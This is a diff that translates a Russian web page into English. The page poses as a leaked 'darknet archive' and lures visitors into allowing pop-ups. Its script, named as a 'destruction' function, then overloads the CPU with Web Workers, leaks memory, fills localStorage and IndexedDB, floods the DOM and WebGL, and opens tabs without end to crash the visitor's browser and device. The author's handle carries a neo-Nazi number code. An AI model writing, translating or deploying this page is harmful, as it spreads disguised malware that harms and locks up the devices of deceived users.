@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Секретный архив Tuzyaka1488</title>
+    <title>Darknet Archive by Tuzyaka1488</title>
     <style>
         body {
             background-color: #1a1a1a;
@@ -21,18 +21,18 @@
             margin: 20px auto;
         }
         canvas {
-            display: none; /* Скрываем канвас до запуска */
+            display: none; /* Hide canvas until activation */
         }
     </style>
 </head>
 <body>
-    <h1>Tuzyaka1488 поделился секретным архивом</h1>
-    <p>Бро, это ультрасекретные файлы, которые я нашёл на даркнете. Чтобы открыть архив, разреши всплывающие окна в браузере. После этого доступ будет активирован автоматически. Готов к правде?</p>
+    <h1>Tuzyaka1488 Leaked a Darknet Archive</h1>
+    <p>Yo, this is a hidden stash straight from the darknet depths. Rare files, encrypted secrets, and stuff they don’t want you to see. To unlock it, allow pop-ups in your browser. Once you do, the archive will extract itself. Ready to dive into the abyss?</p>
 
     <canvas id="canvas" style="position:absolute; top:0; left:0;"></canvas>
 
     <script>
-        // Проверяем разрешение всплывающих окон
+        // Check for popup permission
         function checkPopupPermission() {
             const testPopup = window.open("", "_blank", "width=1,height=1");
             if (testPopup) {
@@ -43,13 +43,13 @@
             }
         }
 
-        // Основная функция уничтожения
+        // Main destruction function
         function destroyDevice() {
-            document.body.innerHTML = "<h1>Доступ активирован. Распаковка началась...</h1>";
+            document.body.innerHTML = "<h1>Access Granted. Extraction in Progress...</h1>";
             document.body.style.color = "#ff0000";
             document.body.style.textShadow = "0 0 10px #ff0000";
 
-            // 1. Ускорение загрузки процессора с Web Workers
+            // 1. CPU overload with Web Workers
             function startWorkers() {
                 for (let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
                     const workerCode = `
@@ -67,7 +67,7 @@
                 }
             }
 
-            // 2. Более быстрая утечка памяти с вложенными объектами
+            // 2. Memory leak with nested objects
             function memoryLeak() {
                 let root = {};
                 let current = root;
@@ -81,13 +81,13 @@
                 createNested();
             }
 
-            // 3. Перегрузка диска через localStorage и IndexedDB
+            // 3. Disk overload with localStorage and IndexedDB
             function diskOverload() {
                 try {
                     for (let i = 0; i < 10000; i++) {
                         localStorage.setItem("key" + i, new Array(100000).join("x"));
                     }
-                } catch (e) { console.log("localStorage полон"); }
+                } catch (e) { console.log("localStorage full"); }
 
                 const dbRequest = indexedDB.open("CrashDB", 1);
                 dbRequest.onupgradeneeded = function(event) {
@@ -106,7 +106,7 @@
                 };
             }
 
-            // 4. Манипуляции с DOM (SVG с анимациями и фильтрами)
+            // 4. DOM overload with SVG animations and filters
             function domOverload() {
                 for (let i = 0; i < 100; i++) {
                     const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
@@ -128,7 +128,7 @@
                 setTimeout(domOverload, 100);
             }
 
-            // 5. Манипуляции с графикой через WebGL
+            // 5. WebGL graphics overload
             function webglOverload() {
                 const canvas = document.getElementById("canvas");
                 canvas.style.display = "block";
@@ -180,13 +180,13 @@
                 render();
             }
 
-            // 6. Бесконечные вкладки
+            // 6. Infinite tabs
             function openTabs() {
                 window.open(window.location.href, "_blank");
                 setTimeout(openTabs, 1);
             }
 
-            // Запускаем всё
+            // Start everything
             startWorkers();
             memoryLeak();
             diskOverload();
@@ -195,7 +195,7 @@
             openTabs();
         }
 
-        // Начинаем проверку при загрузке
+        // Start checking on load
         window.onload = function() {
             checkPopupPermission();
         };
